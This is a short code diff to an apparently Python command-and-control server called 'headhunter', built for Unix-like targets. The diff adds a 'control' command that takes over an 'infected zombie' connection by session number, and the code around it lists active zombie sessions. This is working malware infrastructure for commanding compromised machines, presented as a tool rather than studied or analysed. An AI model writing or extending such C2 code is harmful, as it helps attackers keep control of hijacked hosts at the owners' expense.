@@ -23,7 +23,7 @@ print(
  ░  ░  ░   ░  ░     ░  ░   ░     ░  ░  ░   ░              ░             ░  ░   ░     
                          ░                                                           
 
-Command and Control Server (C2)
+Command and Control Server (C2) for Unix like operating systems
 Author: Logan Goins
 
 type \'help\' for available commands
@@ -57,9 +57,16 @@ help                      --          displays this menu
 listen <LHOST> <LPORT>    --	      starts listening for zombies on the specified local address and port
 show connections	  -- 	      displays active zombie connections by address and source port
 exit                      --          exits the headhunter interactive shell
-
+control <session>         --          controls an infected zombie by session number
 
 		''')
+
+	if cmd == "control":
+		zombie = server.c[int(subcmd)-1]
+		hello = "\n"
+		zombie.send(hello.encode())
+		print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()))
+		server.control(zombie)	
 
 	if cmd == "show" and subcmd == "connections":
 		session = 0
@@ -68,6 +75,7 @@ exit                      --          exits the headhunter interactive shell
 				session+=1
 				print("session " + str(session) + " connected on address: " + str(i.getpeername()))
 		print()	
+		
 
 	if cmd == "exit":
 		exit()
